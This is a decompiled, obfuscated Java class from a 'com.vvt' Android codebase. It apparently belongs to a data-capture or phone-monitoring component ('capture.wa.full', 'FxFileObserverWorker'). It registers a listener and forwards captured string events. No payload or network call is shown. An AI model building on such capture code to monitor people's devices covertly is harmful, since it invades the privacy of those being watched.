package com.vvt.al.g;

import com.vvt.base.capture.i;

public class a
  implements com.vvt.base.capture.e, i
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private i c;
  private com.vvt.capture.wa.full.e d;
  private boolean e;
  
  public a()
  {
    com.vvt.capture.wa.full.e locale = com.vvt.capture.wa.full.e.a();
    this.d = locale;
  }
  
  public void a()
  {
    boolean bool = this.e;
    if (bool)
    {
      bool = b;
      if (bool) {}
      i locali = this.c;
      locali.a();
    }
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    this.e = true;
    this.c = parami;
    com.vvt.capture.wa.full.e locale = this.d;
    locale.a(this);
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    this.c.a(paramString);
  }
  
  public void a(String paramString1, String paramString2)
  {
    boolean bool = this.e;
    if (bool)
    {
      bool = b;
      if (bool) {}
      i locali = this.c;
      locali.a(paramString1, paramString2);
    }
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = false;
    this.e = false;
    com.vvt.capture.wa.full.e locale = this.d;
    if (locale != null)
    {
      locale = this.d;
      locale.b(this);
    }
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/FxFileObserverWorker/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */